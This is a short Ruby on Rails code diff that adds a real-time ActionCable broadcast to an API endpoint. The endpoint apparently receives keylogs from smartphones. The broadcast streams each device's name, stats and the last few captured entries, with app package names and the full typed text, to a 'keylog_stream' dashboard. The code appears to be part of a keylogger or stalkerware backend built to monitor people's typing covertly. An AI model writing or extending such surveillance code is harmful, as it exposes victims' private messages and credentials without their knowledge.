@@ -39,6 +39,16 @@ module Api
         received_at: Time.current
       }, expires_in: 24.hours)
 
+      # Push real-time update to dashboard via ActionCable
+      ActionCable.server.broadcast("keylog_stream", {
+        type: 'new_keylogs',
+        device_id: device_id,
+        device_name: smartphone.name,
+        stats: processor.stats,
+        timestamp: Time.current.iso8601,
+        preview: processor.entries.last(5).map { |e| { app: e[:app_package], text: e[:full_text], time: e[:timestamp]&.iso8601 } }
+      }) rescue nil
+
       render json: {
         status: 'received',
         device_id: device_id,
